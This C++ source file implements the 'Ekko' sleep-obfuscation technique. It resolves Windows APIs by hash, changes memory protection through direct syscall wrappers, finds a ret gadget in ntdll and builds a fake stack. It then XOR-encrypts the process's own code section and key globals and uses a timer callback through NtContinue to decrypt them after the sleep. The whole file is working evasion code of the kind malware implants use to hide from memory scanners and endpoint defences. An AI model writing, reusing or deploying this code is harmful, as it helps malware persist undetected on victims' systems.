#include "SleepEkko.h"
#include "ApiHash.h"
#include "Syscalls.h"

#include <windows.h>

#include <cstdint>
#include <cstring>

namespace ekko {

extern "C" void EkkoDecrypt();
extern "C" unsigned char ekkoFakeStack[4096];
extern "C" CONTEXT ekkoCtxB;
extern "C" unsigned char ekkoKey[16];
extern "C" std::uintptr_t ekkoText;
extern "C" std::uintptr_t ekkoSize;
extern "C" unsigned char ekkoHeapKey[16];
extern "C" std::uintptr_t ekkoHeapText;
extern "C" std::uintptr_t ekkoHeapSize;
extern "C" std::uintptr_t ekkoNtContinue;
extern "C" std::uintptr_t ekkoRetGadget;
extern "C" std::uintptr_t ekkoFakeStackTop;
extern "C" std::uintptr_t ekkoEvent;
extern "C" std::uintptr_t ekkoSetEvent;
extern "C" std::uintptr_t ekkoExitThread;

namespace {

bool find_text(void* m, std::uint8_t*& b, std::size_t& s) {
    auto p = reinterpret_cast<std::uint8_t*>(m);
    auto d = reinterpret_cast<IMAGE_DOS_HEADER*>(p);
    if (d->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto n = reinterpret_cast<IMAGE_NT_HEADERS*>(p + d->e_lfanew);
    if (n->Signature != IMAGE_NT_SIGNATURE) return false;
    auto x = IMAGE_FIRST_SECTION(n);
    for (WORD i = 0; i < n->FileHeader.NumberOfSections; ++i) {
        if (std::memcmp(x[i].Name, ".text", 5) == 0) {
            b = p + x[i].VirtualAddress;
            s = x[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

std::uintptr_t pd(std::uintptr_t x) { return x & ~0xFFFULL; }
std::uintptr_t pu(std::uintptr_t x) { return (x + 0xFFFULL) & ~0xFFFULL; }

void pr(void* p, std::size_t n, DWORD prot) {
    std::uint8_t* a = reinterpret_cast<std::uint8_t*>(pd(reinterpret_cast<std::uintptr_t>(p)));
    std::uint8_t* z = reinterpret_cast<std::uint8_t*>(pu(reinterpret_cast<std::uintptr_t>(p) + n));
    std::size_t sz = static_cast<std::size_t>(z - a);
    std::uint32_t old = 0;
    syscalls::ScProtectVm((void*)-1, reinterpret_cast<void**>(&a), &sz, prot, &old);
}

void* ib() {
    auto peb = reinterpret_cast<void**>(__readgsqword(0x60));
    return peb ? peb[2] : nullptr;
}

void* resolve(const char* dll, const char* fn) {
    return api::export_by_hash(API_HASH(dll), API_HASH(fn));
}

std::uintptr_t find_ret_gadget() {
    void* ntdll = api::module_by_hash(API_HASH("ntdll.dll"));
    if (!ntdll) return 0;
    auto b = reinterpret_cast<std::uint8_t*>(ntdll);
    auto d = reinterpret_cast<IMAGE_DOS_HEADER*>(b);
    auto n = reinterpret_cast<IMAGE_NT_HEADERS*>(b + d->e_lfanew);
    auto s = IMAGE_FIRST_SECTION(n);
    for (WORD i = 0; i < n->FileHeader.NumberOfSections; ++i) {
        if (std::memcmp(s[i].Name, ".text", 5) == 0) {
            for (std::size_t j = 0; j + 1 < s[i].Misc.VirtualSize; ++j) {
                if (b[s[i].VirtualAddress + j] == 0xC3) {
                    return reinterpret_cast<std::uintptr_t>(b + s[i].VirtualAddress + j);
                }
            }
        }
    }
    return 0;
}

} // namespace

void sleep(std::uint32_t seconds) {
    if (!seconds) return;

    auto cqt = reinterpret_cast<BOOL(WINAPI*)(HANDLE*, HANDLE, void*, PVOID, DWORD, DWORD, ULONG)>(
        resolve("kernel32.dll", "CreateTimerQueueTimer"));
    auto wso = reinterpret_cast<DWORD(WINAPI*)(HANDLE, DWORD)>(
        resolve("kernel32.dll", "WaitForSingleObject"));
    auto crt = reinterpret_cast<HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR)>(
        resolve("kernel32.dll", "CreateEventA"));
    auto se = reinterpret_cast<BOOL(WINAPI*)(HANDLE)>(
        resolve("kernel32.dll", "SetEvent"));
    auto et = reinterpret_cast<void(WINAPI*)(DWORD)>(
        resolve("kernel32.dll", "ExitThread"));
    auto gen = reinterpret_cast<NTSTATUS(WINAPI*)(void*, PUCHAR, ULONG, ULONG)>(
        resolve("bcrypt.dll", "BCryptGenRandom"));
    if (!cqt || !wso || !crt || !se || !et || !gen) { Sleep(seconds * 1000); return; }

    ekkoNtContinue = reinterpret_cast<std::uintptr_t>(resolve("ntdll.dll", "NtContinue"));
    if (!ekkoNtContinue) { Sleep(seconds * 1000); return; }
    ekkoRetGadget = find_ret_gadget();
    if (!ekkoRetGadget) { Sleep(seconds * 1000); return; }

    std::uint8_t* tb = nullptr;
    std::size_t tsz = 0;
    if (!find_text(ib(), tb, tsz)) { Sleep(seconds * 1000); return; }

    ekkoText = reinterpret_cast<std::uintptr_t>(tb);
    ekkoSize = tsz;
    gen(nullptr, ekkoKey, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    ekkoHeapText = pd(reinterpret_cast<std::uintptr_t>(&ekkoCtxB));
    ekkoHeapSize = pu(reinterpret_cast<std::uintptr_t>(&ekkoExitThread) + 8) - ekkoHeapText;
    gen(nullptr, ekkoHeapKey, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    HANDLE ev = crt(nullptr, FALSE, FALSE, nullptr);
    if (!ev) { Sleep(seconds * 1000); return; }
    ekkoEvent = reinterpret_cast<std::uintptr_t>(ev);
    ekkoSetEvent = reinterpret_cast<std::uintptr_t>(se);
    ekkoExitThread = reinterpret_cast<std::uintptr_t>(et);

    ekkoFakeStackTop = reinterpret_cast<std::uintptr_t>(&ekkoFakeStack[4096]);
    // The top of the fake stack holds the return address for the ret gadget: EkkoDecrypt.
    *reinterpret_cast<std::uintptr_t*>(ekkoFakeStackTop - 8) = reinterpret_cast<std::uintptr_t>(&EkkoDecrypt);

    std::memset(&ekkoCtxB, 0, sizeof(CONTEXT));
    ekkoCtxB.ContextFlags = CONTEXT_ALL;
    ekkoCtxB.Rip = ekkoRetGadget;
    ekkoCtxB.Rsp = ekkoFakeStackTop - 8; // ret will pop EkkoDecrypt into RIP
    ekkoCtxB.Rbp = ekkoCtxB.Rsp;
    ekkoCtxB.Rdx = 0; // RaiseAlert for NtContinue if needed

    pr(reinterpret_cast<void*>(ekkoText), ekkoSize, PAGE_READWRITE);
    for (std::size_t i = 0; i < ekkoSize; ++i) {
        reinterpret_cast<std::uint8_t*>(ekkoText)[i] ^= ekkoKey[i & 15];
    }
    pr(reinterpret_cast<void*>(ekkoText), ekkoSize, PAGE_EXECUTE_READ);

    pr(reinterpret_cast<void*>(ekkoHeapText), ekkoHeapSize, PAGE_READWRITE);
    for (std::size_t i = 0; i < ekkoHeapSize; ++i) {
        reinterpret_cast<std::uint8_t*>(ekkoHeapText)[i] ^= ekkoHeapKey[i & 15];
    }
    pr(reinterpret_cast<void*>(ekkoHeapText), ekkoHeapSize, PAGE_READWRITE);

    HANDLE t = nullptr;
    cqt(&t, nullptr, reinterpret_cast<WAITORTIMERCALLBACK>(ekkoNtContinue),
        &ekkoCtxB, seconds * 1000, 0, WT_EXECUTEINTIMERTHREAD);

    wso(ev, INFINITE);

    CloseHandle(ev);
    std::memset(ekkoKey, 0, 16);
    std::memset(ekkoHeapKey, 0, 16);
}

} // namespace ekko
